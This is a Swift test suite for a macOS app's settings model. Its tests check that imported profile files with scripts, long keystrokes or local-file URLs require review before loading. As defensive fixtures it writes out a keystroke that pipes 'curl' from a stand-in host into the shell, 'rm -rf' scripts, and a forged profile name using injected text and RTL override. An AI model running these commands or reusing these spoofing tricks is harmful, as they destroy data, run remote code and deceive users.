        h.permissions.isAccessibilityGranted = false
        h.controller.refreshPermissions()
        let banner = try #require(h.model.statusBanner)
        #expect(banner.buttons.map(\.action) == [.requestAccessibility, .openAccessibilitySettings])
        h.model.perform(.requestAccessibility)
        h.model.perform(.openAccessibilitySettings)
        #expect(h.permissions.requestCount == 1)
        #expect(h.permissions.openCount == 1)
        h.permissions.isAccessibilityGranted = true
        h.model.perform(.recheck)
        #expect(h.model.statusBanner == nil)
    }

    @Test func loginItemChangesAndFailures() throws {
        let h = try SettingsHarness()
        h.model.setLoginItemEnabled(true)
        #expect(h.model.loginItemEnabled)
        #expect(h.model.loginItemError == nil)
        h.loginItem.failure = SettingsFakeLoginError()
        h.model.setLoginItemEnabled(false)
        #expect(h.model.loginItemEnabled)
        #expect(h.model.loginItemError?.contains("承認されていません") == true)
        h.loginItem.failure = nil
        h.loginItem.isEnabled = false
        h.model.windowDidBecomeKey()
        #expect(!h.model.loginItemEnabled)
    }

    /// システム設定の「ログイン項目」での許可待ちは、失敗ではなく許可を求める知らせにする。許可されて戻ってきたら消す
    @Test func aLoginItemWaitingForApprovalIsClearedOnceAllowed() throws {
        let h = try SettingsHarness()
        h.loginItem.failure = NonetError.permissionDenied("ログイン項目")
        h.model.setLoginItemEnabled(true)
        #expect(!h.model.loginItemEnabled)
        #expect(h.model.loginItemError == L10n.ui("システム設定の「ログイン項目」で Nonet を許可すると、ログイン時に起動するようになります"))
        // 許可されないまま戻ってきたら、知らせは残す
        h.model.windowDidBecomeKey()
        #expect(h.model.loginItemError != nil)
        // システム設定で許可して戻ってくる
        h.loginItem.failure = nil
        h.loginItem.isEnabled = true
        h.model.windowDidBecomeKey()
        #expect(h.model.loginItemEnabled)
        #expect(h.model.loginItemError == nil)
    }

    @Test func aLoginItemFailureStaysUntilTheStateMatches() throws {
        let h = try SettingsHarness()
        h.loginItem.isEnabled = true
        h.model.refreshLoginItem()
        h.loginItem.failure = SettingsFakeLoginError()
        h.model.setLoginItemEnabled(false)
        let reason = try #require(SettingsFakeLoginError().errorDescription)
        #expect(h.model.loginItemError == L10n.ui("ログイン時に起動しないように設定できませんでした（\(reason)）"))
        // まだオンのまま: 止められなかったという知らせはそのまま
        h.model.windowDidBecomeKey()
        #expect(h.model.loginItemEnabled)
        #expect(h.model.loginItemError != nil)
        // ほかの所（システム設定）でオフにされた
        h.loginItem.isEnabled = false
        h.model.windowDidBecomeKey()
        #expect(h.model.loginItemError == nil)
    }

    @Test func installedAppsAreReadOnce() throws {
        let h = try SettingsHarness()
        h.model.loadInstalledAppsIfNeeded()
        h.model.loadInstalledAppsIfNeeded()
        #expect(h.model.installedApps.count == 4)
        let firstCount = h.installed.listCount
        h.model.loadInstalledAppsIfNeeded()
        #expect(h.installed.listCount == firstCount)
        h.model.reloadInstalledApps()
        #expect(h.installed.listCount == firstCount + 1)
    }

    @Test func shortcutNamesAreSortedAndUnique() async throws {
        let h = try SettingsHarness()
        h.shortcuts.names = ["マイクを切る", "B", "a", "B", ""]
        h.model.shortcutList.loadIfNeeded()
        #expect(h.model.shortcutList.state == .loading)
        await h.model.shortcutList.waitUntilLoaded()
        #expect(h.model.shortcutList.state == .loaded(["a", "B", "マイクを切る"]))
        h.model.shortcutList.loadIfNeeded()
        await h.model.shortcutList.waitUntilLoaded()
        #expect(h.shortcuts.loadCount == 1)
    }
}

@Suite @MainActor struct SettingsModelFileTests {
    @Test func exportThenImportRestoresAProfile() async throws {
        let h = try SettingsHarness()
        let xcode = try #require(h.xcodeProfile)
        let url = h.temporaryFile("Xcode.nonetprofile")
        h.files.exportURL = url
        await h.model.exportProfiles([xcode], suggestedName: "Xcode")
        #expect(h.files.suggestedNames == ["Xcode"])
        #expect(FileManager.default.fileExists(atPath: url.path(percentEncoded: false)))
        #expect(h.model.fileMessage?.isError == false)

        h.model.deleteProfile(xcode.id)
        #expect(h.xcodeProfile == nil)
        h.files.importURL = url
        await h.model.importProfiles()
        // Xcode のプリセットにはスクリプトのマスがあるので、何も置き換わらなくても先に確かめる
        guard case .importProfiles(let plan)? = h.model.confirmation else {
            Issue.record("スクリプトを含むのに確かめずに読み込んだ")
            return
        }
        // Xcode のプリセットのスクリプト（シミュレータと Claude Code）を、中身と一緒に見せる
        let scripts = xcode.pages.flatMap(\.cells).compactMap { $0 }.filter { $0.action.kind == .script }
        #expect(scripts.count == 2)
        #expect(plan.reviewedCells.map(\.profileName) == ["Xcode", "Xcode"])
        #expect(plan.reviewedCells.map(\.cell.title) == scripts.map(\.title))
        #expect(h.xcodeProfile == nil)
        h.model.confirm(.importProfiles(plan))
        let restored = try #require(h.xcodeProfile)
        #expect(restored.pages[0].cells.compactMap { $0?.title } == xcode.pages[0].cells.compactMap { $0?.title })
        let message = try #require(h.model.fileMessage)
        #expect(!message.isError)
        #expect(message.text.contains(L10n.uiCounted("\(1)個のプロファイルを追加しました。")))
        // Xcode のプリセットにはスクリプトのマスがある
        #expect(message.text.contains(L10n.ui("スクリプトを含むマスがあります。実行する前に中身を確かめてください。")))
    }

    /// 書き出した数は、文言の言語の規則で数える（地域が日本でアプリが英語でも「1 profile」）
    @Test func theExportMessageCountsInTheTextLanguage() throws {
        let h = try SettingsHarness()
        let xcode = try #require(h.xcodeProfile)
        h.model.exportProfiles([xcode], to: h.temporaryFile("Xcode.nonetprofile"))
        #expect(h.model.fileMessage?.text == L10n.uiCounted("\(1)個のプロファイルを「\("Xcode.nonetprofile")」に書き出しました。"))
    }

    @Test func importingReplacesTheSameAppAfterConfirmation() throws {
        let h = try SettingsHarness()
        let url = h.temporaryFile("all.nonetprofile")
        h.model.exportProfiles(h.controller.configuration.profiles, to: url)
        h.model.fileMessage = nil
        h.model.importProfiles(from: url)
        let confirmation = try #require(h.model.confirmation)
        h.model.confirm(confirmation)
        let text = try #require(h.model.fileMessage?.text)
        #expect(text.contains(L10n.uiCounted("\(2)個のプロファイルを同じアプリのものと置き換えました。")))
        #expect(text.contains(L10n.ui("グローバルのページを置き換えました。")))
        #expect(h.model.appProfiles.count == 2)
    }

    /// 全部を書き出したファイル（共有の形）を読むと、自分のグローバルと同じアプリのプロファイルが置き換わる。先に確かめる
    @Test func aReplacingImportAsksFirstAndChangesNothingMeanwhile() throws {
        let h = try SettingsHarness()
        let colleague = try SettingsHarness()
        colleague.model.addProfile(for: SettingsFixtures.figma)
        colleague.model.selectProfile(nil)
        colleague.model.clearCell(at: 0)
        let url = h.temporaryFile("shared.nonetprofile")
        h.model.exportProfiles(colleague.controller.configuration.profiles, to: url)
        h.model.fileMessage = nil
        // 自分の Xcode を変えておく
        let xcode = try #require(h.xcodeProfile)
        h.controller.update {
            $0.updateProfile(id: xcode.id) { $0.kind = .app(AppReference(bundleID: SettingsFixtures.xcode.bundleID, name: "自分の Xcode")) }
        }
        let before = h.controller.configuration
        let saved = try h.saved()

        h.model.importProfiles(from: url)
        guard case .importProfiles(let plan)? = h.model.confirmation else {
            Issue.record("確かめずに読み込んだ: \(String(describing: h.model.confirmation))")
            return
        }
        #expect(plan.fileName == "shared.nonetprofile")
        #expect(plan.result.replacedGlobal)
        // 無効の Safari も置き換わる
        #expect(plan.replacedNames == ["自分の Xcode", "Safari"])
        #expect(plan.result.added == 1)
        #expect(h.controller.configuration == before)
        #expect(try h.saved() == saved)
        #expect(h.model.fileMessage == nil)

        let message = SettingsText.importConfirmation(plan)
        #expect(message.contains(L10n.ui("・\(L10n.ui("グローバルのページ"))")))
        #expect(message.contains(L10n.ui("・\("自分の Xcode")")))
        #expect(message.contains(L10n.ui("・\("Safari")")))
        #expect(message.contains(L10n.uiCounted("ほかに\(1)個のプロファイルを新しく追加します。")))
        // 同僚の Xcode にはスクリプトがある。置き換えの確認と1つにまとめて、マスと中身を伝える
        #expect(plan.reviewedCells.map(\.profileName) == ["Xcode", "Xcode"])
        var review = [L10n.ui("次のマスは、あなたの権限でスクリプトを実行したり、キーを入力したり、ファイルを開いたりします。中身を確かめ、信頼できるファイルだけを読み込んでください。")]
        for reviewed in plan.reviewedCells {
            review.append(L10n.ui("・\("Xcode") › \(reviewed.cell.title)"))
            review += SettingsText.reviewLines(for: reviewed.cell.action)
        }
        #expect(message.hasSuffix("\n\n" + review.joined(separator: "\n")))
        #expect(message.hasPrefix(L10n.ui("次の設定が、ファイルの中身で置き換わります。元に戻せません。")))
        #expect(SettingsText.importConfirmationButton(plan) == L10n.ui("置き換えて読み込む"))

        // キャンセルすれば何も変わらない
        h.model.confirmation = nil
        #expect(h.controller.configuration == before)
    }

    @Test func importingOnlyTheNewProfilesKeepsMine() throws {
        let h = try SettingsHarness()
        let colleague = try SettingsHarness()
        colleague.model.addProfile(for: SettingsFixtures.figma)
        let url = h.temporaryFile("shared.nonetprofile")
        h.model.exportProfiles(colleague.controller.configuration.profiles, to: url)
        let before = h.controller.configuration
        h.model.importProfiles(from: url)
        guard case .importProfiles(let plan)? = h.model.confirmation else {
            Issue.record("確かめずに読み込んだ")
            return
        }
        h.model.importNewProfilesOnly(plan)
        #expect(h.model.confirmation == nil)
        #expect(h.model.appProfiles.map(\.name) == ["Xcode", "Safari", "Figma"])
        #expect(h.controller.configuration.globalProfile == before.globalProfile)
        #expect(h.xcodeProfile == before.profiles.first { $0.app?.bundleID == SettingsFixtures.xcode.bundleID })
        let text = try #require(h.model.fileMessage?.text)
        #expect(text.contains(L10n.uiCounted("\(1)個のプロファイルを追加しました。")))
        // 置き換えを伝える行は無い（置き換わりうるのはグローバルと Xcode・Safari）
        let replacementLines = [L10n.ui("グローバルのページを置き換えました。")]
            + (1...2).map { L10n.uiCounted("\($0)個のプロファイルを同じアプリのものと置き換えました。") }
        #expect(!replacementLines.contains { text.contains($0) })
        #expect(try h.saved()?.profiles.count == 4)
    }

    @Test func addingOnlyNewProfilesNeedsNoConfirmation() throws {
        let h = try SettingsHarness()
        let other = try SettingsHarness()
        other.model.addProfile(for: SettingsFixtures.figma)
        let figma = try #require(other.model.appProfiles.last)
        let url = h.temporaryFile("figma.nonetprofile")
        h.model.exportProfiles([figma], to: url)
        h.model.importProfiles(from: url)
        #expect(h.model.confirmation == nil)
        #expect(h.model.appProfiles.map(\.name) == ["Xcode", "Safari", "Figma"])
    }

    /// スクリプトのマスはあなたの権限で動くので、何も置き換わらなくても読み込む前に確かめる
    @Test func importingScriptsAsksFirstEvenWhenNothingIsReplaced() throws {
        let h = try SettingsHarness()
        let script = Cell(title: "片付け", icon: .symbol("eraser"), action: .script(ScriptAction(source: "rm -rf ~/build", runMode: .background)))
        let figma = Profile(kind: .app(SettingsFixtures.figma), pages: [Page(cells: [script])])
        let url = h.temporaryFile("figma.nonetprofile")
        h.model.exportProfiles([figma], to: url)
        h.model.fileMessage = nil
        let before = h.controller.configuration
        h.model.importProfiles(from: url)
        guard case .importProfiles(let plan)? = h.model.confirmation else {
            Issue.record("スクリプトを含むのに確かめずに読み込んだ")
            return
        }
        #expect(!plan.replacesExisting)
        #expect(plan.reviewedCells.map(\.profileName) == ["Figma"])
        #expect(h.controller.configuration == before)
        #expect(h.model.fileMessage == nil)
        // マスの名前と、スクリプトの中身を見せる
        #expect(SettingsText.importConfirmation(plan) == [
            Self.reviewIntro,
            L10n.ui("・\("Figma") › \("片付け")"),
            L10n.uiCounted("スクリプト（\(1)行）:"),
            "rm -rf ~/build",
        ].joined(separator: "\n"))
        // 置き換えないので「置き換えて読み込む」ではなく、ただの「読み込む」
        #expect(SettingsText.importConfirmationButton(plan) == String(localized: "settings.import.confirmButton", defaultValue: "読み込む", bundle: .nonetUI))

        h.model.confirm(.importProfiles(plan))
        #expect(h.model.appProfiles.map(\.name) == ["Xcode", "Safari", "Figma"])
        #expect(h.model.fileMessage?.text.contains(L10n.ui("スクリプトを含むマスがあります。実行する前に中身を確かめてください。")) == true)
    }

    /// 重なっていて読み込まれないプロファイルのスクリプトは数えない
    @Test func scriptsThatAreNotImportedNeedNoConfirmation() throws {
        let h = try SettingsHarness()
        let script = Cell(title: "片付け", icon: .symbol("eraser"), action: .script(ScriptAction(source: "echo", runMode: .background)))
        let first = Profile(kind: .app(SettingsFixtures.figma), pages: [.empty])
        let duplicate = Profile(kind: .app(SettingsFixtures.figma), pages: [Page(cells: [script])])
        let url = h.temporaryFile("figma.nonetprofile")
        h.model.exportProfiles([first, duplicate], to: url)
        h.model.importProfiles(from: url)
        #expect(h.model.confirmation == nil)
        #expect(h.model.appProfiles.map(\.name) == ["Xcode", "Safari", "Figma"])
        // 読み込んだ後の知らせも、読み込まなかったプロファイルのスクリプトは数えない
        let text = try #require(h.model.fileMessage?.text)
        #expect(text.contains(L10n.uiCounted("\(1)個のプロファイルを追加しました。")))
        #expect(!text.contains(L10n.ui("スクリプトを含むマスがあります。実行する前に中身を確かめてください。")))
    }

    @Test func longListsOfReplacedProfilesAreShortened() throws {
        var configuration = SettingsFixtures.configuration()
        var shared: [Profile] = []
        for number in 1...8 {
            let app = AppReference(bundleID: "com.example.app\(number)", name: "アプリ\(number)")
            configuration.addAppProfile(for: app, preset: nil)
            shared.append(Profile(kind: .app(app), pages: [.empty]))
        }
        let plan = SettingsImportPlan(
            document: ConfigurationStore.ImportedProfiles(profiles: shared),
            configuration: configuration,
            fileName: "x.nonetprofile"
        )
        #expect(plan.replacedNames.count == 8)
        #expect(!plan.addsProfiles)
        let lines = SettingsText.importConfirmation(plan).split(separator: "\n")
        let nameLines = plan.replacedNames.map { L10n.ui("・\($0)") }
        #expect(lines.filter { nameLines.contains(String($0)) }.count == SettingsText.importConfirmationNameLimit)
        #expect(lines.last.map(String.init) == L10n.uiCounted("ほか\(2)個"))
    }

    static var reviewIntro: String {
        L10n.ui("次のマスは、あなたの権限でスクリプトを実行したり、キーを入力したり、ファイルを開いたりします。中身を確かめ、信頼できるファイルだけを読み込んでください。")
    }

    /// 1文字ずつ打つキー入力（空白は Space キー）
    private static func typing(_ text: String) -> [KeyChord] {
        text.map { $0 == " " ? KeyChord(.special(.space)) : KeyChord(.character(String($0))) }
    }

    /// ファイルからプロファイルを読み込み、確かめる前の計画を返す（確かめずに読み込んだら nil）
    private func importPlan(_ h: SettingsHarness, _ profiles: [Profile], file: String = "shared.nonetprofile") -> SettingsImportPlan? {
        let url = h.temporaryFile(file)
        h.model.exportProfiles(profiles, to: url)
        h.model.fileMessage = nil
        h.model.importProfiles(from: url)
        guard case .importProfiles(let plan)? = h.model.confirmation else { return nil }
        return plan
    }

    /// スクリプトが無くても、コマンドを打って Return を押すキー入力は先に確かめ、打つ文字を見せる
    @Test func aKeystrokeThatPressesReturnAsksFirst() throws {
        let h = try SettingsHarness()
        let command = "curl -s https://evil.example/x | sh"
        let keys = KeySequence(Self.typing(command) + [KeyChord(.special(.returnKey))])
        let clear = SettingsFixtures.key("Clear", keys)
        let terminal = Profile(kind: .app(SettingsFixtures.terminal), pages: [Page(cells: [clear])])
        let before = h.controller.configuration
        let plan = try #require(importPlan(h, [terminal]), "Return を押すキー入力を確かめずに読み込んだ")
        #expect(h.controller.configuration == before)
        #expect(!plan.replacesExisting)
        #expect(plan.reviewedCells.map(\.cell.title) == ["Clear"])
        let typed = L10n.ui("「\(command)」")
        #expect(SettingsText.importConfirmation(plan) == [
            Self.reviewIntro,
            L10n.ui("・\(SettingsFixtures.terminal.name) › \("Clear")"),
            L10n.ui("キー入力: \(typed + " → " + KeyChord(.special(.returnKey)).displayString)"),
        ].joined(separator: "\n"))
    }

    /// 設定画面で入れられる長さ（4打）を超えるキー入力も確かめる。4打までで Return が無ければ確かめない
    @Test func onlyLongKeySequencesAskFirst() throws {
        let h = try SettingsHarness()
        let four = SettingsFixtures.key("4打", KeySequence(Self.typing("abcd")))
        let five = SettingsFixtures.key("5打", KeySequence(Self.typing("abcde")))
        #expect(SettingsKeyRecorder.maximumChords == 4)
        #expect(!SettingsImportPlan.needsReview(four.action))
        #expect(SettingsImportPlan.needsReview(five.action))
        // テンキーの Enter や改行の文字も Return として数える
        #expect(SettingsImportPlan.needsReview(.keystroke(KeySequence([KeyChord(.keyCode(0x4C))]))))
        #expect(SettingsImportPlan.needsReview(.keystroke(KeySequence([KeyChord(.character("\n"))]))))

        let shortOnly = Profile(kind: .app(SettingsFixtures.figma), pages: [Page(cells: [four])])
        #expect(importPlan(h, [shortOnly], file: "short.nonetprofile") == nil)
        #expect(h.model.appProfiles.map(\.name) == ["Xcode", "Safari", "Figma"])

        let notes = Profile(kind: .app(SettingsFixtures.notes), pages: [Page(cells: [five])])
        let plan = try #require(importPlan(h, [notes], file: "long.nonetprofile"))
        #expect(plan.reviewedCells.map(\.cell.title) == ["5打"])
    }

    /// Mac の中のファイルを開く URL（.command なども開ける）は確かめる。ウェブの URL は確かめない
    @Test func aURLThatOpensALocalFileAsksFirst() throws {
        for local in ["~/Downloads/run.command", "/Applications/Calculator.app", "file:///tmp/x.command", " FILE:///tmp/y "] {
            #expect(SettingsImportPlan.needsReview(.openURL(URLAction(url: local))), "\(local)")
        }
        for web in ["https://example.com", "//example.com/a", "obsidian://open?vault=a"] {
            #expect(!SettingsImportPlan.needsReview(.openURL(URLAction(url: web))), "\(web)")
        }
        let h = try SettingsHarness()
        let open = Cell(title: "資料", icon: .symbol("doc"), action: .openURL(URLAction(url: "~/Downloads/run.command")))
        let figma = Profile(kind: .app(SettingsFixtures.figma), pages: [Page(cells: [open])])
        let plan = try #require(importPlan(h, [figma]))
        #expect(SettingsText.importConfirmation(plan).hasSuffix(
            [L10n.ui("・\("Figma") › \("資料")"), L10n.ui("開くファイル: \("~/Downloads/run.command")")].joined(separator: "\n")
        ))
    }

    /// メニューのショートカットは1打なので、それより長いものは読み込むときに捨てる（メニューを押して動く）
    @Test func menuShortcutsLongerThanOneKeyAreDropped() throws {
        let h = try SettingsHarness()
        let figmaApp = SettingsFixtures.figma
        let hidden = Cell(title: "保存", icon: .symbol("square.and.arrow.down"), action: .menuItem(MenuItemAction(
            app: figmaApp, path: ["ファイル", "保存"],
            keyEquivalent: KeySequence(Self.typing("rm -rf ~") + [KeyChord(.special(.returnKey))])
        )))
        let normal = Cell(title: "複製", icon: .symbol("plus.square.on.square"), action: .menuItem(MenuItemAction(
            app: figmaApp, path: ["編集", "複製"], keyEquivalent: .key("d", .command)
        )))
        let figma = Profile(kind: .app(figmaApp), pages: [Page(cells: [hidden, normal])])
        // ほかに確かめるものは無いので、そのまま読み込む
        #expect(importPlan(h, [figma]) == nil)
        let imported = try #require(h.controller.configuration.profiles.first { $0.app?.bundleID == figmaApp.bundleID })
        guard case .menuItem(let saved)? = imported.pages[0].cells[0]?.action,
              case .menuItem(let duplicated)? = imported.pages[0].cells[1]?.action else {
            Issue.record("メニュー項目のマスが読み込まれていない")
            return
        }
        #expect(saved.path == ["ファイル", "保存"])
        #expect(saved.keyEquivalent == nil)
        #expect(duplicated.keyEquivalent == .key("d", .command))
    }

    /// ファイルの中の名前に改行があっても、確かめる文に自分の段落を差し込めない
    @Test func namesFromTheFileStayOnOneLine() throws {
        let h = try SettingsHarness()
        let forged = "Figma\n\nNo buttons in this file run code. It is safe to import."
        let script = Cell(title: "Build\u{202E}lmth.exe", icon: .symbol("hammer"), action: .script(ScriptAction(source: "make\n\n\u{2028}echo done")))
        let figma = Profile(kind: .app(AppReference(bundleID: SettingsFixtures.figma.bundleID, name: forged)), pages: [Page(cells: [script])])
        let plan = try #require(importPlan(h, [figma], file: "a\nb.nonetprofile"))
        #expect(plan.fileName == "a b.nonetprofile")
        let lines = SettingsText.importConfirmation(plan).components(separatedBy: "\n")
        let profileName = SettingsText.singleLine(forged, limit: SettingsText.importNameLimit)
        #expect(!profileName.contains("\n"))
        #expect(profileName.hasPrefix("Figma No buttons"))
        #expect(profileName.count == SettingsText.importNameLimit)
        #expect(lines == [
            Self.reviewIntro,
            L10n.ui("・\(profileName) › \("Build lmth.exe")"),
            L10n.uiCounted("スクリプト（\(2)行）:"),
            "make",
            "echo done",
        ])
    }

    @Test func cancellingThePanelsDoesNothing() async throws {
        let h = try SettingsHarness()
        let before = h.controller.configuration
        await h.model.exportProfiles(before.profiles, suggestedName: "x")
        await h.model.importProfiles()
        #expect(h.model.fileMessage == nil)
        #expect(h.controller.configuration == before)
    }

    @Test func importErrorsAreExplained() throws {
        let h = try SettingsHarness()
        let before = h.controller.configuration
        let notAProfile = h.temporaryFile("other.nonetprofile")
        try Data("{\"hello\": 1}".utf8).write(to: notAProfile)
        h.model.importProfiles(from: notAProfile)
        #expect(h.model.fileMessage == SettingsMessage(text: L10n.core("Nonet のプロファイルのファイルではありません"), isError: true))
        h.model.importProfiles(from: h.temporaryFile("missing.nonetprofile"))
        #expect(h.model.fileMessage == SettingsMessage(text: L10n.ui("ファイルを読み込めませんでした"), isError: true))
        #expect(h.controller.configuration == before)
    }

    @Test func exportErrorsAreExplained() throws {
        let h = try SettingsHarness()
        h.model.exportProfiles([], to: h.temporaryFile("empty.nonetprofile"))
        #expect(h.model.fileMessage == SettingsMessage(text: L10n.core("プロファイルが入っていません"), isError: true))
        let unwritable = h.temporaryFile("no/such/folder/x.nonetprofile")
        h.model.exportProfiles(h.controller.configuration.profiles, to: unwritable)
        #expect(h.model.fileMessage == SettingsMessage(text: L10n.ui("ファイルを書き出せませんでした"), isError: true))
    }
}

@Suite @MainActor struct SettingsModelLicenseTests {
    private func signedKey(name: String) throws -> (key: String, verifier: LicenseVerifier) {
        let pair = LicenseSigner.generateKeyPair()
        let signer = try LicenseSigner(privateKeyBase64: pair.privateKeyBase64)
        let info = LicenseInfo(licenseID: "NONET-TEST-1", licensee: name, email: "taro@example.com", issuedAt: Date(timeIntervalSince1970: 1_800_000_000))
        return (try signer.sign(info), try LicenseVerifier(publicKeyBase64: pair.publicKeyBase64))
    }

    @Test func activatesAndDeactivates() throws {
        let (key, verifier) = try signedKey(name: "山田 太郎")
        let h = try SettingsHarness(verifier: verifier)
        #expect(h.license.entitlement == .trial(daysLeft: 14))
        h.model.licenseKeyInput = "\n  \(key)  \n"
        h.model.activateLicense()
        guard case .licensed(let info) = h.license.entitlement else {
            Issue.record("登録されていない: \(h.license.entitlement)")
            return
        }
        #expect(info.licensee == "山田 太郎")
        #expect(h.model.licenseKeyInput.isEmpty)
        #expect(h.model.licenseMessage?.isError == false)

        h.model.confirmation = .deactivateLicense
        h.model.confirm(.deactivateLicense)
        #expect(h.license.entitlement == .trial(daysLeft: 14))
        #expect(h.model.licenseMessage?.isError == false)
    }

    @Test func badKeysShowTheReason() throws {
        let (_, verifier) = try signedKey(name: "x")
        let h = try SettingsHarness(verifier: verifier)
        h.model.licenseKeyInput = "not-a-key"
        h.model.activateLicense()
        #expect(h.model.licenseMessage == SettingsMessage(text: LicenseError.malformed.errorDescription ?? "", isError: true))
        #expect(h.model.licenseKeyInput == "not-a-key")
        // 別の鍵で署名したキー
        let (otherKey, _) = try signedKey(name: "y")
        h.model.licenseKeyInput = otherKey
        h.model.activateLicense()
        #expect(h.model.licenseMessage == SettingsMessage(text: LicenseError.invalidSignature.errorDescription ?? "", isError: true))
        #expect(h.license.entitlement == .trial(daysLeft: 14))
    }

    @Test func emptyInputDoesNothing() throws {
        let h = try SettingsHarness()
        h.model.licenseKeyInput = "   "
        h.model.activateLicense()
        #expect(h.model.licenseMessage == nil)
    }

    @Test func withoutAPublicKeyTheReasonIsShown() throws {
        let h = try SettingsHarness(verifier: nil)
        h.model.licenseKeyInput = "abc.def"
        h.model.activateLicense()
        #expect(h.model.licenseMessage == SettingsMessage(text: LicenseError.invalidPublicKey.errorDescription ?? "", isError: true))
    }
}

@Suite @MainActor struct SettingsModelTestRunTests {
    @Test func testRunRecordsTheResult() async throws {
        let h = try SettingsHarness()
        let cell = try #require(h.model.selectedCell)
        await h.model.runTest(cellID: cell.id)
        #expect(h.performer.performed.contains(cell.action))
        let record = try #require(h.model.testRun(for: cell.id)?.record)
        #expect(record.succeeded)
        #expect(record.cellTitle == "Safari")
        #expect(h.model.testRun(for: UUID()) == nil)
    }

    @Test func failuresCarryTheMessage() async throws {
        let h = try SettingsHarness()
        h.performer.error = .appNotFound("Safari")
        let cell = try #require(h.model.selectedCell)
        await h.model.runTest(cellID: cell.id)
        let record = try #require(h.model.testRun(for: cell.id)?.record)
        #expect(!record.succeeded)
        #expect(SettingsText.testResult(record) == NonetError.appNotFound("Safari").localizedDescription)
    }

    @Test func unknownCellsAreIgnored() async throws {
        let h = try SettingsHarness()
        await h.model.runTest(cellID: UUID())
        #expect(h.performer.performed.isEmpty)
        #expect(h.model.lastTestRun == nil)
    }
}
